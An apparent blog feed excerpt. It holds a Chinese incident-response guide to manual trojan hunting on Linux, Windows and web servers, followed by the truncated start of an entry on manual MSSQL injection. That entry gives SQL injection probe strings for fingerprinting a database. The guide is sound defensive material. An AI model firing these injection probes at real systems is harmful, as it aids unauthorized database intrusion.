    <link href="http://yoursite.com/2018/08/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%B7%A5%E6%9D%80%E9%A9%AC/"/>
    <id>http://yoursite.com/2018/08/22/应急响应手工杀马/</id>
    <published>2018-08-22T07:05:42.000Z</published>
    <updated>2018-08-22T12:25:41.450Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-113.png" alt="upload successful"></p><h1 id="一-什么是应急响应"><a href="#一-什么是应急响应" class="headerlink" title="一.什么是应急响应"></a>一.什么是应急响应</h1><p>应急响应的目的:恢复系统的CIA</p><h3 id="应急响应6个阶段："><a href="#应急响应6个阶段：" class="headerlink" title="应急响应6个阶段："></a>应急响应6个阶段：</h3><p>pdcerf</p><p>准备、检测、遏制、根除、恢复、跟踪</p><h3 id="安全事件分类："><a href="#安全事件分类：" class="headerlink" title="安全事件分类："></a>安全事件分类：</h3><p>1.Web入侵：挂马、篡改、Webshell，僵  木  蠕  等有害程序</p><p>2.网络攻击类 : DOS   DDOS  扫描</p><p>3.信息破坏类：网站内容篡改、假冒信息，脱裤、数据库登录（弱口令）</p><p>4.信息内容安全：不良言论</p><p>5.设备的软硬件故障</p><p>6.自然灾害</p><p>7.系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞</p><h3 id="事件分级（四级）"><a href="#事件分级（四级）" class="headerlink" title="事件分级（四级）:"></a>事件分级（四级）:</h3><p>原则：根据信息系统的危害程度，信息系统的重要性、以及对社会的影响等</p><p>1.特大</p><p>2.重大</p><p>3.严重</p><p>4.一般</p><h1 id="二-排查思路"><a href="#二-排查思路" class="headerlink" title="二.排查思路"></a>二.排查思路</h1><p>一个常规的入侵事件后的系统排查思路：</p><p><img src="\images\pasted-110.png" alt="upload successful"></p><h3 id="1-文件分析"><a href="#1-文件分析" class="headerlink" title="1.文件分析"></a>1.文件分析</h3><p>文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件</p><p>webshell排查分析</p><p>核心应用关联目录文件分析</p><h3 id="2-进程分析"><a href="#2-进程分析" class="headerlink" title="2.进程分析"></a>2.进程分析</h3><p>当前活动进程 &amp; 远程连接 </p><p>启动进程 &amp; 计划任务</p><p>进程工具分析:    windows：Pchunter</p><pre><code>linux:  Chkrootkit&amp;Rkhunter</code></pre><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><p>系统变量</p><p>环境变量</p><p>history</p><p>系统配置文件</p><h3 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h3><p>操作系统日志</p><p>windows事件查看器(eventvwr),  linux( /var/log)</p><p>应用日志分析: access.log     Error.log</p><h1 id="三-分析排查"><a href="#三-分析排查" class="headerlink" title="三.分析排查"></a>三.分析排查</h1><h2 id="Linux分析排查"><a href="#Linux分析排查" class="headerlink" title="Linux分析排查"></a>Linux分析排查</h2><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h5 id="敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）"><a href="#敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）" class="headerlink" title="敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）"></a>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）</h5><p> 例如: 查看tmp目录下的文件： <code>ls –alt /tmp/</code></p><p>查看开机启动项内容：<code>ls -alt /etc/init.d/</code></p><p>查看指定目录下文件时间的排序：<code>ls -alt | head -n 10</code></p><p>针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改。</p><h5 id="新增文件分析"><a href="#新增文件分析" class="headerlink" title="新增文件分析"></a>新增文件分析</h5><p>例如要查找24小时内被修改的文件：</p><p><code>find   ./  -mtime 0 -name “文件名”</code> （最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）</p><p>查找72小时内新增的文件 : <code>find / -ctime -2</code>      -ctime 内容未改变权限改变时候也可以查出</p><p>根据确定时间去反推变更的文件：  <code>ls -al /tmp | grep &quot;Feb 27&quot;</code></p><h5 id="特殊权限的文件"><a href="#特殊权限的文件" class="headerlink" title="特殊权限的文件 "></a>特殊权限的文件 </h5><p>查找777的权限的文件 <code>find  / *.jsp   -perm 4777</code></p><h5 id="隐藏的文件"><a href="#隐藏的文件" class="headerlink" title="隐藏的文件"></a>隐藏的文件</h5><p>（以 “.”开头的具有隐藏属性的文件）</p><p>在文件分析过程中，手工排查频率较高的命令是 find   grep     ls 核心目的是为了关联推理出可疑文件。</p><p>进程分析</p><h5 id="使用netstat-网络连接命令"><a href="#使用netstat-网络连接命令" class="headerlink" title="使用netstat 网络连接命令"></a>使用netstat 网络连接命令</h5><p>分析可疑端口、可疑IP、可疑PID及程序进程  <code>netstat   –antlp | more</code></p><h5 id="使用ps命令，分析进程"><a href="#使用ps命令，分析进程" class="headerlink" title="使用ps命令，分析进程"></a>使用ps命令，分析进程</h5><p><code>ps aux | grep pid | grep –v grep</code></p><h5 id="查看指定端口对应的程序"><a href="#查看指定端口对应的程序" class="headerlink" title="查看指定端口对应的程序"></a>查看指定端口对应的程序</h5><p>使用<code>lsof -i:1677</code></p><h5 id="使用ls-以及-stat-查看系统命令是否被替换"><a href="#使用ls-以及-stat-查看系统命令是否被替换" class="headerlink" title="使用ls 以及 stat 查看系统命令是否被替换"></a>使用ls 以及 stat 查看系统命令是否被替换</h5><p> 两种思路：</p><p>第一种查看命令目录最近的时间排序</p><p>第二种根据确定时间去匹配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ls -alt /usr/bin | head -10 ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</span><br></pre></td></tr></table></figure></p><h5 id="隐藏进程查看"><a href="#隐藏进程查看" class="headerlink" title="隐藏进程查看"></a>隐藏进程查看</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk &apos;&#123;print&#125;&apos; | sort -n | uniq &gt;1</span><br><span class="line">ls /proc | sort -n |uniq &gt;2</span><br><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><h5 id="查看分析任务计划"><a href="#查看分析任务计划" class="headerlink" title="查看分析任务计划"></a>查看分析任务计划</h5><p> a.通过<code>crontabl –l</code> 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；</p><p> b.查看etc目录任务计划相关文件，<code>ls /etc/cron*</code></p><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">history (cat /root/.bash_history)</span><br><span class="line">/etc/passwd</span><br><span class="line">crontab  /etc/cron*</span><br><span class="line">rc.local  /etc/init.d chkconfig</span><br><span class="line">last</span><br><span class="line">$PATH</span><br><span class="line">strings</span><br></pre></td></tr></table></figure><h5 id="查看分析history-cat-root-bash-history"><a href="#查看分析history-cat-root-bash-history" class="headerlink" title="查看分析history (cat /root/.bash_history)"></a>查看分析history (cat /root/.bash_history)</h5><p>曾经的命令操作痕迹，以便进一步排查溯源。有可能通过记录关联到如下信息：</p><p>a.wget 远程某主机（域名&amp;IP）的远控文件；</p><p> b.尝试连接内网某主机（ssh scp），便于分析攻击者意图; </p><p>c.打包某敏感数据或代码，tar zip 类命令 </p><p>d.对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</p><h5 id="查看分析用户相关分析"><a href="#查看分析用户相关分析" class="headerlink" title="查看分析用户相关分析"></a>查看分析用户相关分析</h5><p>a. <code>useradd userdel</code> 的命令时间变化（stat），以及是否包含可疑信息</p><p> b. <code>cat /etc/passwd</code> 分析可疑帐号，可登录帐号 查看UID为0的帐号：</p><pre><code> `awk  -F: &apos;{if($3==0)print $1}&apos; /etc/passwd `</code></pre><p>c. 查看能够登录的帐号：</p><pre><code>  `cat /etc/passwd | grep -E &quot;/bin/bash$&quot; `</code></pre><p>PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</p><h5 id="查看linux-开机启动程序"><a href="#查看linux-开机启动程序" class="headerlink" title="查看linux 开机启动程序"></a>查看linux 开机启动程序</h5><p>a.  <code>查看rc.local文件（/etc/init.d/rc.local /etc/rc.local）</code></p><p> b.  <code>ls –alt /etc/init.d/ c) chkconfig</code></p><h5 id="查看系统用户登录信息"><a href="#查看系统用户登录信息" class="headerlink" title="查看系统用户登录信息 "></a>查看系统用户登录信息 </h5><p>a.  使用lastlog命令，系统中所有用户最近一次登录信息。</p><p> b.  使用lastb命令，用于显示用户错误的登录列表 c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp） utmp文件中保存的是当前正在本系统中的用户的信息。 wtmp文件中保存的是登录过本系统的用户的信息。 /var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp</p><h5 id="系统路径分析"><a href="#系统路径分析" class="headerlink" title="系统路径分析"></a>系统路径分析</h5><p><code>echo $PATH</code>分析有无敏感可疑信息</p><h5 id="指定信息检索"><a href="#指定信息检索" class="headerlink" title="指定信息检索 "></a>指定信息检索 </h5><p>a.  strings命令在对象文件或二进制文件中查找可打印的字符串 </p><p>b.  分析sshd 文件，是否包括IP信息</p><h5 id="查看ssh相关目录有无可疑的公钥存在"><a href="#查看ssh相关目录有无可疑的公钥存在" class="headerlink" title="查看ssh相关目录有无可疑的公钥存在"></a>查看ssh相关目录有无可疑的公钥存在</h5><p> a.   Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。 </p><p>b.   目录： /etc/ssh ./.ssh/</p><h3 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h3><p>推荐工具：<br>chkrootkit       rkhunter（<a href="http://www.chkrootkit.org" target="_blank" rel="noopener">www.chkrootkit.org</a> rkhunter.sourceforge.net）</p><h5 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h5><p>(迭代更新了20年)主要功能：<br>1    检测是否被植入后门、木马、rootkit<br>2    检测系统命令是否正常<br>3    检测登录日志<br>4    详细参考README</p><h5 id="rkhunter："><a href="#rkhunter：" class="headerlink" title="rkhunter："></a>rkhunter：</h5><p>1    系统命令（Binary）检测，包括Md5 校验<br>2    Rootkit检测<br>3    本机敏感目录、系统配置、服务及套间异常检测<br>4    三方应用版本检测</p><h5 id="Webshell查找"><a href="#Webshell查找" class="headerlink" title="Webshell查找"></a>Webshell查找</h5><p>Github上存在各种版本的webshell查杀脚本</p><p>通过chkrootkit 、rkhunter、Webshell Check 等手段得出以下应对措施：</p><p>1.根据进程、连接等信息关联的程序，查看木马活动信息</p><p>2.假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</p><p>3.发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</p><p>4.发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/log/message       包括整体系统信息</span><br><span class="line">/var/log/auth.log        包含系统授权信息，包括用户登录和使用的权限机制等</span><br><span class="line">/var/log/userlog         记录所有等级用户信息的日志。</span><br><span class="line">/var/log/cron           记录crontab命令是否被正确的执行</span><br><span class="line">/var/log/xferlog(vsftpd.log)记录Linux FTP日志</span><br><span class="line">/var/log/lastlog         记录登录的用户，可以使用命令lastlog查看</span><br><span class="line">/var/log/secure         记录大多数应用输入的账号与密码，登录成功与否</span><br><span class="line">var/log/wtmp　　      记录登录系统成功的账户信息，等同于命令last</span><br><span class="line">var/log/faillog　　      记录登录系统不成功的账号信息，一般会被黑客删除</span><br></pre></td></tr></table></figure></p><h5 id="日志查看分析"><a href="#日志查看分析" class="headerlink" title="日志查看分析"></a>日志查看分析</h5><p>grep,sed,sort,awk</p><h5 id="基于时间的日志管理："><a href="#基于时间的日志管理：" class="headerlink" title="基于时间的日志管理："></a>基于时间的日志管理：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/wtmp /var/run/utmp /var/log/lastlog(lastlog) /var/log/btmp(lastb)</span><br></pre></td></tr></table></figure><h5 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h5><p>可以关注Accepted、Failed password 、invalid特殊关键字</p><h5 id="登录相关命令"><a href="#登录相关命令" class="headerlink" title="登录相关命令"></a>登录相关命令</h5><p> lastlog 记录最近几次成功登录的事件和最后一次不成功的登录</p><h5 id="who-命令查询utmp文件"><a href="#who-命令查询utmp文件" class="headerlink" title="who 命令查询utmp文件"></a>who 命令查询utmp文件</h5><p>Who的缺省输出包括用户名、终端类型、登录日期及远程主机</p><h5 id="w-命令查询utmp文件"><a href="#w-命令查询utmp文件" class="headerlink" title="w 命令查询utmp文件"></a>w 命令查询utmp文件</h5><p>显示当前系统中每个用户和它所运行的进程信息</p><h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p>用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数</p><h5 id="last-命令"><a href="#last-命令" class="headerlink" title="last 命令"></a>last 命令</h5><p>往回搜索wtmp来显示自从文件第一次创建以来登录过的用户</p><h5 id="finger-命令"><a href="#finger-命令" class="headerlink" title="finger 命令"></a>finger 命令</h5><p>用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。</p><h5 id="日志命令"><a href="#日志命令" class="headerlink" title="日志命令"></a>日志命令</h5><p>定位有多少IP在爆破主机的root帐号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure></p><p>登录成功的IP有哪些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  </span><br><span class="line"></span><br><span class="line">tail -400f demo.log #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">less demo.log #查看日志文件，支持上下滚屏，查找功能  </span><br><span class="line"></span><br><span class="line">uniq -c demo.log  #标记该行重复的数量，不重复值为1 </span><br><span class="line"></span><br><span class="line">grep -c &apos;ERROR&apos; demo.log   #输出文件demo.log中查找所有包行ERROR的行的数量</span><br></pre></td></tr></table></figure></p><h3 id="相关处置"><a href="#相关处置" class="headerlink" title="相关处置"></a>相关处置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kill -9</span><br><span class="line">chattr –i  加锁</span><br><span class="line">rm</span><br><span class="line">setfacl</span><br><span class="line">ssh</span><br><span class="line">chmod  000  把木马去权限</span><br></pre></td></tr></table></figure><h2 id="Windows分析排查"><a href="#Windows分析排查" class="headerlink" title="Windows分析排查"></a>Windows分析排查</h2><h4 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h4><ol><li><p>开机启动有无异常文件</p></li><li><p>各个盘下的temp(tmp)相关目录下查看有无异常文件</p></li><li><p>浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</p></li><li><p>查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</p></li><li><p>查看用户recent相关文件，通过分析最近打开分析可疑文件</p></li></ol><p> C:\Documents and Settings\Administrator\Recent</p><p> C:\Documents and Settings\Default User\Recent</p><p> 开始,运行 %UserProfile%\Recent</p><ol start="6"><li>根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件</li></ol><h4 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h4><ol><li><p><code>netstat -ano</code> 查看目前的网络连接，定位可疑的ESTABLISHED</p></li><li><p>根据netstat 定位出的pid，再通过tasklist命令进行进程定位</p></li><li>通过tasklist命令查看可疑程序</li></ol><h4 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h4><p>1.使用set命令查看变量的设置<br>2.Windows 的计划任务；<br>3.Windows 的帐号信息，如隐藏帐号等<br>4.配套的注册表信息检索查看，SAM文件以及远控软件类<br>5.查看systeminfo 信息，系统版本以及补丁信息 例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）… 若进行漏洞比对，建议使用Windows-Exploit-Suggester <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester/</a></p><h4 id="后门排查-1"><a href="#后门排查-1" class="headerlink" title="后门排查"></a>后门排查</h4><p>PC Hunter是一个Windows系统信息查看软件<br><a href="http://www.xuetr.com/" target="_blank" rel="noopener">http://www.xuetr.com/</a></p><p>功能列表如下：</p><p>1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能<br>2.内核驱动模块查看，支持内核驱动模块的内存拷贝</p><p>3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook<br>4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除<br>5.端口信息查看，目前不支持2000系统<br>6.查看消息钩子<br>7.内核模块的iat、eat、inline hook、patches检测和恢复<br>8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除<br>9.注册表编辑<br>10.进程iat、eat、inline hook、patches检测和恢复<br>11.文件系统查看，支持基本的文件操作<br>12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME<br>13.ObjectType Hook检测和恢复<br>14.DPC定时器检测和删除<br>15.MBR Rootkit检测和修复<br>16.内核对象劫持检测<br>17.WorkerThread枚举<br>18.Ndis中一些回调信息枚举<br>19.硬件调试寄存器、调试相关API检测<br>20.枚举SFilter/Fltmgr的回调</p><p>PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p>1.打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）<br>2.主要分析安全日志，可以借助自带的筛选功能</p><p>3.可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</span><br></pre></td></tr></table></figure></p><p>4.强大的日志分析工具Log Parser</p><p>#分析IIS日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</span><br></pre></td></tr></table></figure></p><p>比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675&quot;</span><br></pre></td></tr></table></figure></p><p>事件ID是很好的索引</p><p>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p><h4 id="相关处置-1"><a href="#相关处置-1" class="headerlink" title="相关处置"></a>相关处置</h4><p>1.通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)<br>2.木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除<br>3.最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p><p>### </p><h2 id="应用类"><a href="#应用类" class="headerlink" title="应用类"></a>应用类</h2><p>Apache、tomcat、Nginx、IIS<br>无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find . access_log |grep xargs ip攻击地址</span><br><span class="line">find . access_log| grep xargs 木马文件名</span><br><span class="line">页面访问排名前十的IP</span><br><span class="line">cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">页面访问排名前十的URL</span><br><span class="line">cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">查看最耗时的页面</span><br><span class="line">cat access.log | sort -k 2 -n -r | head 10</span><br></pre></td></tr></table></figure></p><p>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。</p><p>首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p><img src="\images\pasted-111.png" alt="upload successful"></p><p>一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。</p><p><img src="\images\pasted-112.png" alt="upload successful"></p><h1 id="应急总结"><a href="#应急总结" class="headerlink" title="应急总结"></a>应急总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">核心思路是“顺藤摸瓜”</span><br><span class="line">碎片信息的关联分析</span><br><span class="line">时间范围的界定以及关键操作时间点串联</span><br><span class="line">Web入侵类，shell定位很重要</span><br><span class="line">假设与求证</span><br><span class="line">攻击画像与路线确认</span><br></pre></td></tr></table></figure><h5 id="常见的入侵方式Getshell方法"><a href="#常见的入侵方式Getshell方法" class="headerlink" title="常见的入侵方式Getshell方法 "></a>常见的入侵方式Getshell方法 </h5><p>a) WEB入侵 i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞 </p><p>b) 系统入侵 i. SSH 破解后登录操作 ii. RDP 破解后登录操作 iii. MSSQL破解后远控操作 iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）</p><p> c) 典型应用 i. Mail暴力破解后信息挖掘及漏洞利用 ii. VPN暴力破解后绕过边界 iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行 iv. Rsync 未授权访问类 v. Mongodb未授权访问类 vi. Elasticsearch命令执行漏洞 vii. Memcache未授权访问漏洞 viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p><h5 id="应急需求有哪些分类："><a href="#应急需求有哪些分类：" class="headerlink" title="应急需求有哪些分类："></a>应急需求有哪些分类：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> a) 被谁入侵了？ 关联 攻击IP 攻击者信息</span><br><span class="line"></span><br><span class="line"> b) 怎么入侵的？ 关联 入侵时间轴、漏洞信息 </span><br><span class="line"></span><br><span class="line">c) 为什么被入侵？ 关联 行业特性、数据信息、漏洞信息 </span><br><span class="line"></span><br><span class="line">d) 数据是否被窃取？ 关联 日志审计</span><br><span class="line"></span><br><span class="line"> e) 怎么办？ 关联 隔离、排查分析、删马（解密）、加固、新运营</span><br></pre></td></tr></table></figure><h1 id="资源参考"><a href="#资源参考" class="headerlink" title="资源参考"></a>资源参考</h1><p><a href="https://www.waitalone.cn/linux-find-webshell.html" target="_blank" rel="noopener">https://www.waitalone.cn/linux-find-webshell.html</a><br><a href="http://vinc.top/category/yjxy/" target="_blank" rel="noopener">http://vinc.top/category/yjxy/</a><br><a href="http://www.shellpub.com/" target="_blank" rel="noopener">http://www.shellpub.com/</a><br><a href="http://linux.vbird.org/linux_security/0420rkhunter.php" target="_blank" rel="noopener">http://linux.vbird.org/linux_security/0420rkhunter.php</a><br><a href="https://cisofy.com/download/lynis/" target="_blank" rel="noopener">https://cisofy.com/download/lynis/</a><br><a href="https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1" target="_blank" rel="noopener">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</a><br><a href="http://www.freebuf.com/articles/web/23358.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/23358.html</a><br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br><a href="http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html" target="_blank" rel="noopener">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/tips-7462.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-7462.html</a><br><a href="http://bobao.360.cn/learning/detail/3830.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3830.html</a><br><a href="https://yq.aliyun.com/ziliao/65679" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/65679</a><br><a href="http://secsky.sinaapp.com/188.html" target="_blank" rel="noopener">http://secsky.sinaapp.com/188.html</a><br><a href="http://blog.sina.com.cn/s/blog_d7058b150102wu07.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</a><br><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="noopener">http://www.sleuthkit.org/autopsy/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>手注mssql</title>
    <link href="http://yoursite.com/2018/08/21/mssql/"/>
    <id>http://yoursite.com/2018/08/21/mssql/</id>
    <published>2018-08-21T15:02:22.000Z</published>
    <updated>2018-08-23T14:38:10.165Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-133.png" alt="upload successful"></p><h1 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h1><h3 id="1-判断数据库类型："><a href="#1-判断数据库类型：" class="headerlink" title="1.判断数据库类型："></a>1.判断数据库类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;（撇号）</span><br><span class="line">and (select count(*) from 独有表)&gt;0 </span><br><span class="line">oracle:dual</span><br><span class="line">mssql:sysobjects</span><br><span 